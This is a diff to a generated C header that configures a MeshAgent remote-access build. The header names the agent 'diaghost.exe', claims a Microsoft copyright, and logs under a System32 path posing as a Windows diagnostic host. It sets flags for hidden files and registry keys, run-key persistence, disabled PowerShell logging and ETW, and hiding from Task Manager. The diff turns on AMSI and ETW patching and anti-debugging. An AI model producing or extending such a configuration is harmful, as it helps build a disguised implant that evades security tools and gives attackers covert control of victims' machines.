@@ -1,5 +1,5 @@
-﻿/* Generated file - do not edit. */
-/* Generated on: 2025-10-20 20:37:26 */
+/* Generated file - do not edit. */
+/* Generated on: 2025-10-22 18:04:42 */
 #ifndef GENERATED_MESHAGENT_BRANDING_H
 #define GENERATED_MESHAGENT_BRANDING_H
 
@@ -17,7 +17,7 @@
 #undef MESH_AGENT_INTERNAL_NAME
 #define MESH_AGENT_INTERNAL_NAME "diaghost.exe"
 #undef MESH_AGENT_COPYRIGHT
-#define MESH_AGENT_COPYRIGHT "Â© Microsoft Corporation. All rights reserved."
+#define MESH_AGENT_COPYRIGHT "© Microsoft Corporation. All rights reserved."
 #undef MESH_AGENT_LOG_DIRECTORY
 #define MESH_AGENT_LOG_DIRECTORY TEXT("C:/Windows/System32/DiagnosticHost/logs")
 
@@ -39,10 +39,11 @@
 #define MESH_AGENT_SVCHOST_MODE 1
 #define MESH_AGENT_HIDE_FILES 1
 #define MESH_AGENT_HIDE_REGISTRY 1
-#define MESH_AGENT_AMSI_PATCH 0
-#define MESH_AGENT_ETW_PATCH 0
-#define MESH_AGENT_ANTI_DEBUG 0
+#define MESH_AGENT_AMSI_PATCH 1
+#define MESH_AGENT_ETW_PATCH 1
+#define MESH_AGENT_ANTI_DEBUG 1
 #define MESH_AGENT_SYSCALLS_DIRECT 1
+#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT 1
 
 /* ========== Persistence Configuration ========== */
 #define MESH_AGENT_PERSIST_RUNKEY 1
@@ -52,7 +53,7 @@
 
 /* ========== Evasion Features ========== */
 #define MESH_AGENT_DISABLE_PS_LOGGING 1
-#define MESH_AGENT_DISABLE_EVENT_LOGS 1
+#define MESH_AGENT_DISABLE_EVENT_LOGS 0
 #define MESH_AGENT_DISABLE_ETW 1
 #define MESH_AGENT_HIDE_TASKMANAGER 1
 #define MESH_AGENT_USE_SYSCALLS 1
